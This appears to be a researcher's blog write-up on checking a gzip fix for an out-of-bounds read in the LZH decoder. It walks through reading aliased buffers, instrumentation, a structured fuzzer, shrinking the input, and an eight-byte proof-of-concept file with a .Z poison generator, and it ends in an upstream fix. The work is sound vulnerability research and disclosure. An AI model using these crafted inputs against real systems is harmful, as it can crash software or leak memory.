A patch is a hypothesis

Someone else found a bug in gzip's LZH decoder and the maintainer fixed it. This is how I checked whether the fix was true, from reading the aliasing through to an eight byte proof of concept, with every command and every output.

Elias Hasas · @zer0d4y5 gzip / unlzh.c the finding itself →

A fix commit makes a claim: after this, the bug is gone. That claim is testable, and testing it is one of the cheaper ways to find real bugs, because someone has already done the expensive part of proving the code can be made to misbehave. You inherit a working precondition and a known-reachable sink. All you have to supply is the suspicion that the patch author stopped one line short.

The bug I went after is CVE-2026-41992, an out of bounds read in gzip's LZH decoder, found by Michał Majchrowicz and Marcin Wyczechowski at AFINE and fixed by Paul Eggert in commit 63dbf6b3. The write up of what I found is on the next page over. This one is the method: what I typed, what came back, and the two places the obvious approach fell over.

Everything below reproduces. The three binaries differ only in unlzh.c, pulled straight out of upstream git at three revisions, dropped into an otherwise identical gzip 1.13 tree.

§1Identifying: look for memory with two owners

Before touching a fuzzer I want to know what the bug class is, because that determines whether fuzzing can find it at all. The advisory for the parent CVE says the words "shared global state" and "not reinitialized between files," which is a specific and unusual shape. Most decompressor bugs are a length check missing on one input. This one needs two inputs, in order, in the same process.

So the first question isn't "where's the missing bounds check," it's "which memory has more than one owner." In gzip that's not hidden; it's a design decision from an era when 64 KB mattered, written down in the header:

$ git show 63dbf6b3:unlzh.c | grep -n '^#define \(left\|right\|c_table\|c_len\)'
64:#define left  prev
65:#define right head
71:#define c_len outbuf
81:#define c_table d_buf

Four of the LZH decoder's working arrays aren't its own. left and right, the Huffman tree it walks to decode every symbol, are somebody else's tables wearing a different name. Chase the names one level further:

$ git show 63dbf6b3:gzip.h | grep -n 'define tab_prefix\|define head\|define WSIZE'
119:#  define tab_prefix prev    /* hash link (see deflate.c) */
120:#  define head (prev+WSIZE)  /* hash head (see deflate.c) */
172:#  define WSIZE 0x8000     /* window size--must be a power of two, and */

$ git show 63dbf6b3:gzip.c | grep -n 'DECLARE(ush, tab_prefix'
141:    DECLARE(ush, tab_prefix, 1L<<BITS);

$ git show 63dbf6b3:lzw.h | grep -n 'define BITS'
20:#  define BITS 16

That's the whole vulnerability in three greps, if you're willing to do the arithmetic. prev is one array of 65536 ush. left is prev starting at zero, right is prev starting at 32768, and the same allocation is the LZW prefix table that a .Z member fills with values as high as 65535. Any tree walk index at or above 32768 makes right[i] read past the end. Nothing in the LZH decoder bounds the index, because in a legitimate Huffman table the walk terminates at a leaf long before that.

Which functions actually touch it

Grepping for the array names by hand gives you line numbers without context, and I wanted the enclosing function for each one, so a five line Python script instead of squinting:

$ python3 - <<'PY'
import re
lines = open('unlzh.c').read().split('\n')
fn = '(top level)'
for i, l in enumerate(lines, 1):
    m = re.match(r'^(\w+)\s*\(', l)
    if m and not l.startswith(' '): fn = m.group(1)
    if re.search(r'\b(left|right)\s*\[', l) and not l.strip().startswith('/*'):
        print(f"{fn:<14} unlzh.c:{i:<4} {l.strip()}")
PY
make_table     unlzh.c:174  right[avail] = left[avail] = 0;
make_table     unlzh.c:177  if (k & mask) p = &right[*p];
make_table     unlzh.c:178  else          p = &left[*p];
read_c_len     unlzh.c:248  if (bitbuf & mask) c = right[c];
read_c_len     unlzh.c:249  else               c = left [c];
decode_c       unlzh.c:285  if (bitbuf & mask) j = right[j];
decode_c       unlzh.c:286  else               j = left [j];
decode_p       unlzh.c:303  if (bitbuf & mask) j = right[j];
decode_p       unlzh.c:304  else               j = left [j];

make_table builds; the other three walk. Now the patch:

$ git show 63dbf6b3:unlzh.c | grep -n 'memzero'
239:        memzero(left, (2 * NC - 1) * sizeof *left);
240:        memzero(right, (2 * NC - 1) * sizeof *left);

Two lines, both inside read_c_len, at line 239, nine lines above the walk at 248. Which raises the only question that matters: is line 248 after the memzero on every path, or only on some of them? It's the else of the branch the memzero sits in. So: only on some of them. That took about twenty minutes of reading and cost nothing, and at this point I still had no idea whether it was reachable.

§2Build a harness that can see the bug

Standard setup, three binaries, same tree, same flags, only unlzh.c swapped:

$ curl -fsSL https://ftp.gnu.org/gnu/gzip/gzip-1.13.tar.xz | tar xJ
$ cd gzip-1.13
$ ./configure CFLAGS="-fsanitize=address -g -O0 -fno-omit-frame-pointer" \
              LDFLAGS="-fsanitize=address"
$ make            # once, to generate version.h and lib/

$ for rev in '63dbf6b3^' 63dbf6b3 e7378c2; do
    git -C ../gzip-git show "$rev":unlzh.c > unlzh.c
    rm -f gzip unlzh.o && make gzip >/dev/null && cp gzip ../gzip.$rev
  done

Then I fed it the known bad pair and got nothing. Exit zero, no sanitizer output, no stderr at all.

$ ASAN_OPTIONS=detect_leaks=0 ./gzip.vuln -dc poison.Z minimal.lzh >/dev/null
$ echo "exit=$?  stderr=$(wc -c < asan.err) bytes  reports=$(grep -c AddressSanitizer asan.err)"
exit=0  stderr=0 bytes  reports=0

An hour went into assuming I'd broken the build. I hadn't. The read overshoots by 26164 bytes, and ASan's global redzones are nowhere near that wide, so the access lands cleanly inside a neighbouring global variable. Legitimate memory, as far as the sanitizer is concerned. On the Linux box where the original crash came from, the same overshoot happens to hit an unmapped page and you get a SEGV.

the trap

A sanitizer is an oracle for some memory safety bugs, not all of them. It reports what it can observe, and a global over-read that stays inside the data segment is invisible to it. Treating "ASan is quiet" as "no bug here" would have killed this investigation on day one, on a bug that was already confirmed to exist.

Worse, it fails in the direction that makes you stop looking. Had the platforms been reversed, I'd have found it faster and learned less.

Instrument the index instead

The property I care about is arithmetic, not a fault: does the walk ever compute an index at or above 32768? That's checkable at the source level, and it holds regardless of what the linker did with the surrounding globals. So I wrapped every one of the three walk sites with a predicate, generated by a script so all three builds get byte identical instrumentation:

what each walk site becomes 
{ int _r = (bitbuf & mask) ? 1 : 0; unsigned _i = (unsigned)c;
  if (_r && _i >= 32768)
    fprintf(stderr, "[OOB:%s] right[%u] == prev[%u] / 65536\n", __func__, _i, 32768u + _i);
  if (_r) c = right[c]; else c = left[c]; }

Cheap, deterministic, and it tells you which sink fired, which turned out to matter later when I had to walk back a claim about decode_p.

§3Prove the precondition before you fuzz

The bug needs poisoned arrays. If the .Z file doesn't drive LZW to codes above 32768, no .lzh body will ever reach out of bounds, and I'd be fuzzing a target that cannot fail. That's the classic way to burn a weekend on a green test suite, so I checked it first with a probe printed at huf_decode_start, counting how many slots in the walk's entry region hold a value large enough to go out of bounds on the very next hop:

$ gzip -dc evil.lzh                 # nothing in front of it
poison probe: right[0..1018]  nonzero-sum=0  max=0  slots>=32768: 0

$ gzip -dc benign.gz evil.lzh       # deflate first
poison probe: right[0..1018]  nonzero-sum=0  max=0  slots>=32768: 0

$ gzip -dc poison.Z evil.lzh        # LZW first, same process
poison probe: right[0..1018]  nonzero-sum=30670231  max=32962  slots>=32768: 34

Three runs, and the middle one is the one I'd have skipped if I were in a hurry. A .gz in front leaves the arrays untouched, because inflate works out of window and never goes near prev. Only the LZW path poisons, which is what makes this a cross format bug rather than a generic "gzip mishandles malformed input" bug.

Those 34 slots are the attack surface. The walk enters at an index bounded by make_table's node range, so it starts somewhere low and in bounds; it's the values it finds there that are unbounded, and 34 of them are already large enough to send the next read off the end.

The poison itself is unglamorous. Around 400 KB of structured bytes through compress -b 16, enough distinct strings that LZW allocates codes past 32768:

$ python3 -c "
d=bytearray()
for i in range(200000): d += bytes([(i*73+13)&0xff, (i>>3)&0xff])
open('poison.raw','wb').write(bytes(d))"
$ compress -b 16 -f -c poison.raw > poison.Z

§4Fuzzing: generate structure, not bytes

Random bytes behind an LZH magic will not find this. The decoder reads a block size, then three Huffman tables, and a random bitstream dies at the first make_table consistency check with "Bad table" long before any tree gets walked. To reach line 248 the input has to be shaped like a real header and wrong only in the specific place I care about.

So the generator writes bits, not bytes, and follows the actual grammar the decoder expects. The interesting move is that at each of the three table reads it flips a weighted coin between the degenerate n == 0 form and a real table, because n == 0 is exactly the branch the patch guards:

generator, abridged 
def gen(r):
    w = BW()
    w.put(r.randint(1, 6), 16)                  # blocksize, nonzero

    # read_pt_len(NT=19, nbit=5, special=3)
    if r.random() < 0.7:
        w.put(0, 5); w.put(r.randint(0, 31), 5)  # degenerate: pt_table = const
    else:
        w.put(r.randint(1, 19), 5)
        for _ in range(20): w.put(r.getrandbits(3), 3)

    # read_c_len(nbit=9)  <-- the branch that matters
    if r.random() < 0.6:
        w.put(0, 9); w.put(r.choice([510, 511, r.randint(256, 511)]), 9)
    else:
        w.put(r.randint(1, 40), 9)               # n != 0 -> else-branch, no memzero
        for _ in range(40): w.put(r.getrandbits(4), 4)

    # read_pt_len(NP=14, nbit=4, special=-1)
    if r.random() < 0.7:
        w.put(0, 4); w.put(r.choice([14, 15, r.randint(0, 15)]), 4)
    else:
        w.put(r.randint(1, 14), 4)
        for _ in range(15): w.put(r.getrandbits(3), 3)

    # trailing bits: these steer the tree walks
    for _ in range(r.randint(20, 120)): w.put(r.getrandbits(1), 1)
    return LZH_MAGIC + w.bytes()

Two details earn their keep. Pushing a constant at or above the symbol bound into a degenerate table means every lookup returns "too large," which forces the walk instead of hitting a leaf immediately. And the trailing random bits are the steering: each hop consumes one bit to pick left or right, so that tail is the path through the poisoned array.

Oracle is the instrumented build, so a hit is a line on stderr rather than a signal:

$ python3 hunt.py 4000 11 6
  [ 1] exec 48     15 bytes    1 OOB reads  first sink: decode_p
  [ 2] exec 49     41 bytes   80 OOB reads  first sink: read_c_len
  [ 3] exec 56     42 bytes   26 OOB reads  first sink: read_c_len
  [ 4] exec 108    13 bytes   12 OOB reads  first sink: decode_p
  [ 5] exec 151    39 bytes   21 OOB reads  first sink: read_c_len
  [ 6] exec 225    34 bytes   25 OOB reads  first sink: read_c_len

6 candidates in 226 execs, 11s

Eleven seconds for six candidates, which tells you the grammar is doing the work; unstructured mutation would still be printing "Bad table" tomorrow. Note the per candidate sink labels, since two of the six enter through decode_p and four through read_c_len. Against the patched build only the read_c_len ones survive, and getting that distinction right is the difference between a defensible report and an overclaim.

§5Shrink it until it embarrasses you

A 41 byte crasher proves the bug. An 8 byte crasher proves you understand it, and it's what a maintainer can read in one glance without unpacking a tarball. Delta debugging here is about as simple as it gets: find the shortest surviving prefix, then try to blank each remaining byte to zero. The important part is the predicate. I shrink against the patched build, because a file that only reproduces on the unpatched one is a rediscovery of the parent CVE and worth nothing.

def still_oob(body):
    open("shrink.lzh", "wb").write(body)
    r = subprocess.run(["./gzipT.official", "-dc", POISON, "shrink.lzh"],
                       capture_output=True, timeout=20)
    return b"[OOB:" in r.stderr

lo = 2
while lo < len(body) and not still_oob(body[:lo]): lo += 1
if lo < len(body): body = body[:lo]

for i in range(2, len(body)):
    for v in (0x00, 0x01):
        cand = body[:i] + bytes([v]) + body[i+1:]
        if cand != body and still_oob(cand): body = cand; break
$ python3 shrink.py
start: 41 bytes  1f a0 00 02 07 c5 08 53 72 49 77 aa dc 62 d7 a8 23 3e 06 f5
                 14 c8 06 0d 55 60 41 dd f7 34 e9 a9 e6 b2 15 54 7c bd 06 f4 38
truncate: 41 -> 8 bytes
final: 8 bytes  1f a0 01 00 07 01 00 53

Two bytes of magic and six bytes of body. That is the entire malicious file.

Worth saying: this is not the same 8 byte file I sent upstream in July. That one was 1f a0 00 05 04 c3 00 f3, arrived at from a different seed on a different machine. Two independent runs converging on eight bytes is a decent sign that eight is the floor here, set by the header fields the decoder has to read before the walk can happen at all.

§6The proof of concept

The claim is not "gzip crashes." It's narrower: this specific patched build still reads out of bounds, and it's the cross format poison that does it. Which needs four runs, not one.

$ xxd minimal.lzh
00000000: 1fa0 0100 0701 0053                      .......S

$ for b in vuln official betterfix; do ... done
  vuln       exit=0  OOB reads=8   [OOB:read_c_len] right[45850]==prev[78618]/65536
  official   exit=0  OOB reads=8   [OOB:read_c_len] right[45850]==prev[78618]/65536
  betterfix  exit=0  OOB reads=0

$ ./gzipT.official -dc minimal.lzh     # control: no poison in front
  exit=0  OOB reads=0

Row two is the finding: identical count, identical index, on a build carrying the official fix. Row three is the follow up patch closing it. Row four is the control that keeps the whole thing honest, because without the .Z in front, the same bytes against the same binary do nothing, so the cause is the shared state and not merely a malformed .lzh.

Then the trace, on the patched binary, showing how five hops get from a legal entry index to an address 26 KB past the array:

$ ./gzip.trace -dc poison.Z minimal.lzh >/dev/null   # 63dbf6b3 applied
read_c_len: else-branch taken, entry c=28 >= NT=19, walking the tree
  right[   28] -> 25751
  left [25751] -> 22505
  left [22505] -> 17131
  right[17131] -> 45850
  right[45850] ->     0   OUT OF BOUNDS: that is prev[78618] of prev[65536]

Entry index 28 is small and perfectly legal. right[28] is prev[32796], in bounds, and holding leftover LZW state rather than a tree node. From there every value is attacker influenced by way of whatever the .Z member left behind, and four hops later the index is 45850, so the read is prev[78618] against an array that ends at 65536.

§7What actually mattered

  1. Read for ownership, not for missing checks. The grep that found this bug was #define left prev, not a search for unbounded indexing. Aliased buffers across two decoders is a property you can find by reading a header file; the missing bounds check is a consequence of it.
  2. Check the precondition can be met before building anything on top of it. The poison probe is ten lines and it's the difference between fuzzing a live target and fuzzing a dead one. A fuzzer that cannot possibly find a bug returns the same clean result as a fuzzer running against fixed code.
  3. Pick an oracle that matches the bug, not the tooling you already have. ASan was silent on a real out of bounds read for a reason that had nothing to do with gzip. Four lines of source instrumentation beat it because they test the arithmetic instead of waiting for the memory subsystem to complain.
  4. Minimize against the patched build. Otherwise you spend an afternoon shrinking a rediscovery of the bug that's already fixed.
  5. Run the control. Every claim in the report is a difference between two runs, so each one needs the other run to exist. The no poison row is what makes the rest of the table mean anything, and it's also what caught my decode_p claim being wrong.

That last one deserves the emphasis it's getting. My first draft said two of the three sinks were still exposed after the official fix. Per sink attribution across 1500 executions says otherwise: decode_p goes out of bounds 91 times unpatched and zero times patched, because read_c_len always runs first and its memzero gets there in time. One sink survives, not two. The finding page has the corrected numbers, and I left the correction visible there rather than quietly editing it out.

Paul Eggert replied in about an hour and had a better patch than mine, moving the clear into huf_decode_start so it runs once per file instead of once per branch. It landed the same day as e7378c2.
